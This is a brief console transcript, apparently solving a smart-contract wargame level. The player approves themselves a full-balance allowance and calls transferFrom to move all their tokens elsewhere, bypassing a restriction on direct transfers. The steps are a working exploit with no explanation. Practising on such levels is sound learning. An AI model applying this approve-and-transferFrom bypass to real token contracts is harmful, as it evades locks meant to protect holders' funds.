## Console

```ruby
await contract.balanceOf(player)

(await contract.balanceOf(player)).toString() > '1000000000000000000000000'

(await contract.allowance(player,player)).toString()
'0'

(await contract.approve(player,'1000000000000000000000000')).toString()

(await contract.allowance(player,player)).toString()
'1000000000000000000000000'

await contract.transferFrom(player,'0xF2feE935975342c4B54080244ec93833B380FE91','1000000000000000000000000')
```
